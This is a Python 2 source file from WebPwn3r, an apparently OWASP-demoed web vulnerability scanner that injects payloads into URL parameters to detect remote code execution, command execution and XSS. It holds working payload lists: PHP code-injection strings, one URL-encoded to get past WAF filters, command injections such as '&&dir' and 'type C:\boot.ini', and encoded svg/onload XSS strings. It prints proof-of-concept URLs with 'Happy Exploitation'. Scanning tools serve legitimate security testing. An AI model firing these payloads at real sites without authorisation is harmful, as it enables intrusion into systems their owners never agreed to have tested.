#!/usr/bin/env python
# WebPwn3r is a Web Applications Security Scanner
# By Ebrahim Hegazy - twitter.com/zigoo0
# First demo conducted 12Apr-2014 @OWASP Chapter Egypt
# https://www.owasp.org/index.php/Cairo
import urllib
import re
from headers import *

def main_function(url, payloads, check):
        #This function is going to split the url and try the paylods instead of every parameter value.
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            sp = params.split("=")[1]
            for payload in payloads:
                bugs = url.replace(sp, str(payload).strip())
                request = urllib.urlopen(bugs).readlines()
                for line in request:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red+" [*] Payload Found . . ."+ga.end
                        print ga.red+" [*] Payload: " ,payload +ga.end
                        print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
                        print ga.blue+" [*] POC: "+ga.end + bugs
                        print ga.green+" [*] Happy Exploitation :D"+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" [!] Target is not vulnerable!"+ga.end
        else:
        	print ga.blue+" [!] Congratulations you found %i bugs :) " % (vuln) +ga.end

# Here stands the vulnerabilities functions and detection payloads. 
def rce_func(url):
	headers_reader(url)
  	print ga.bold+" [!] Now Scanning for Remote Code/Command Execution "+ga.end
  	print ga.blue+" [!] Covering Linux & Windows Operating Systems "+ga.end
  	print ga.blue+" [!] Please wait ...."+ga.end
  	# Remote Code Injection Payloads
  	payloads = ['${@print(md5(zigoo0))}', '${@print(md5("zigoo0"))}']
  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
  	payloads += ['%24%7b%40%70%72%69%6e%74%28%6d%64%35%28%22%7a%69%67%6f%6f%30%22%29%29%7d%3b']
  	# Remote Command Execution Payloads
  	payloads += ['uname;', 'dir', '&&dir', 'type C:\\boot.ini', 'phpinfo();', 'phpinfo']
  	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main_function(url, payloads, check)

def xss_func(url):
        print ga.bold+"\n [!] Now Scanning for XSS "+ga.end
        print ga.blue+" [!] Please wait ...."+ga.end
        #Paylod zigoo="css();" added for XSS in <a href TAG's
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        check = re.compile('zigoo0<svg|x>x', re.I)
        main_function(url, payloads, check)
